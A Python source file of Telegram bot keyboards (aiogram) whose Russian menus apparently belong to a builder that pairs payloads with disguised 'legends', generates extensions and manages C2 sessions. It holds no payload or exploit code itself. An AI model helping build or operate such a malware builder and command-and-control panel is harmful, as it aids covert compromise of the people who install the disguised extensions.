from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

from ..core.legend_engine import LegendEngine
from ..core.payload_engine import PayloadEngine
from .c2 import c2_manager


def main_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎭 Выбрать легенду", callback_data="select_legend")],
        [InlineKeyboardButton(text="⚡ Выбрать payload", callback_data="select_payload")],
        [InlineKeyboardButton(text="🚀 Сгенерировать", callback_data="generate")],
        [
            InlineKeyboardButton(text="📡 C2-сессии", callback_data="c2_list"),
            InlineKeyboardButton(text="📊 Расширения", callback_data="my_extensions"),
        ],
        [
            InlineKeyboardButton(text="⚙️ Настройки C2", callback_data="c2_settings"),
            InlineKeyboardButton(text="📖 О проекте", callback_data="about"),
        ],
    ])


def legends_kb() -> InlineKeyboardMarkup:
    engine = LegendEngine()
    buttons = []
    for legend in engine.list_all():
        buttons.append([InlineKeyboardButton(
            text=f"{legend.icon} {legend.name}",
            callback_data=f"legend:{legend.id}",
        )])
    buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="back")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def payloads_kb() -> InlineKeyboardMarkup:
    engine = PayloadEngine()
    buttons = []
    for payload in engine.list_all():
        buttons.append([InlineKeyboardButton(
            text=f"{payload.icon} {payload.name} {payload.risk_emoji()}",
            callback_data=f"payload:{payload.id}",
        )])
    buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="back")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def confirm_generation_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Сгенерировать", callback_data="confirm_generate")],
        [InlineKeyboardButton(text="🔄 Изменить", callback_data="back")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel")],
    ])


def c2_sessions_kb() -> InlineKeyboardMarkup:
    sessions = c2_manager.list_all()
    buttons = []
    for s in sessions[:20]:
        status = "🟢" if s.enabled else "🔴"
        buttons.append([InlineKeyboardButton(
            text=f"{status} {s.legend_name} + {s.payload_name}",
            callback_data=f"c2_view:{s.session_id}",
        )])
    if not sessions:
        buttons.append([InlineKeyboardButton(text="(нет)", callback_data="noop")])
    buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="back")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def c2_session_kb(session_id: str, enabled: bool) -> InlineKeyboardMarkup:
    toggle_text = "🔴 Выключить" if enabled else "🟢 Включить"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=toggle_text, callback_data=f"c2_toggle:{session_id}")],
        [
            InlineKeyboardButton(text="📊 Статистика", callback_data=f"c2_stats:{session_id}"),
            InlineKeyboardButton(text="📄 Файл", callback_data=f"c2_file:{session_id}"),
        ],
        [InlineKeyboardButton(text="🗑 Удалить", callback_data=f"c2_delete:{session_id}")],
        [InlineKeyboardButton(text="⬅️ К списку", callback_data="c2_list")],
    ])


def c2_settings_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔑 Изменить chat_id", callback_data="c2_set_chat_id")],
        [InlineKeyboardButton(text="🗑 Очистить все", callback_data="c2_clear_all")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back")],
    ])


def after_generation_kb(session_id: str | None = None) -> InlineKeyboardMarkup:
    buttons = []
    if session_id:
        buttons.append([InlineKeyboardButton(
            text="📡 Открыть C2-сессию",
            callback_data=f"c2_view:{session_id}",
        )])
    buttons.append([InlineKeyboardButton(text="📊 Расширения", callback_data="my_extensions")])
    buttons.append([InlineKeyboardButton(text="🏠 Главное меню", callback_data="back")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


__all__ = [
    "main_menu_kb",
    "legends_kb",
    "payloads_kb",
    "confirm_generation_kb",
    "c2_sessions_kb",
    "c2_session_kb",
    "c2_settings_kb",
    "after_generation_kb",
]
